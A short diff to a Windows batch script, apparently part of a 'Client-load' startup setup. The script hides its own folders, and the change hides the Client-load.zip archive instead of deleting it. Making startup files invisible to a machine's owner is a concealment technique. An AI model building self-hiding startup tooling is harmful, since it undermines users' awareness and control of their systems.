@@ -39,9 +39,9 @@ REM Hide the Client-load folder and its enclosing folder
 attrib +h "%script_dir%\.."
 attrib +h "%script_dir%\..\.."
 
-REM Delete the Client-load.zip file with the same name as the parent folder
-del /q "%script_dir%\..\Client-load.zip"
+REM Hide the Client-load.zip file with the same name as the parent folder
+attrib +h "%script_dir%\..\Client-load.zip"
 
 REM Display a completion message
 echo.
-echo Startup setup completed. Parent folders hidden and ZIP file deleted.
+echo Startup setup completed. Parent folders and ZIP file hidden.
